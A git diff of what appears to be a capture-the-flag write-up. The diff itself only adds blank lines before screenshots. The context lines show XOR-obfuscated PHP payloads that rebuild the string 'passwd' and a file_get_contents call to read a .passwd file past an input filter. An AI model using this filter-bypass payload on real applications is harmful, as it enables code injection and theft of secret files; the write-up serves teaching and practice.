@@ -74,6 +74,7 @@ d = ('$'^'@')
 passwd   =  ('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@')
 ```
 Let's try entering the string above into the input field
+
 ![](./images/3.png)
 
 It returned `passwd` 
@@ -113,6 +114,7 @@ print (payload)
 ```
 The script output will be : `('&'^'@').(')'^'@').(','^'@').('%'^'@').'_'.('['^'<').('%'^'@').('/'^'[').'_'.('='^'^').('/'^'@').('.'^'@').('/'^'[').('%'^'@').('.'^'@').('/'^'[').('('^'[').'('.'\''.'.'.('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@').'\''.')'` \
 Let's try entering the string above into the input field
+
 ![](./images/4.png)
 
 As we can see the function is not executed but is printed , so let's try another way of executing a function : `(function)(arg)` so `(file_get_contents)(.passwd)`
